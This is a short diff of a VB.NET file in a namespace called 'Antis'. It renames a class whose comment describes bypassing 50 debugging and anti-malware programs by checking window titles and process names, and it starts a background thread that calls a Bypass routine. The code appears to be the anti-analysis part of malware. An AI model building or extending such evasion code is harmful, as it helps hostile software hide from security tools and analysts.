@@ -1,6 +1,6 @@
 ﻿Imports System.Diagnostics
 Namespace Antis
-    Public Class Screening_Programs ' Bypassing 50 Debugging and Anti-Malware Programs Using MainWindowTitle + GetProcessesByName
+    Public Class Anti_Debugging
         Public Function Start()
             Dim thread As New Threading.Thread(Sub() Bypass(True))
             thread.IsBackground = True
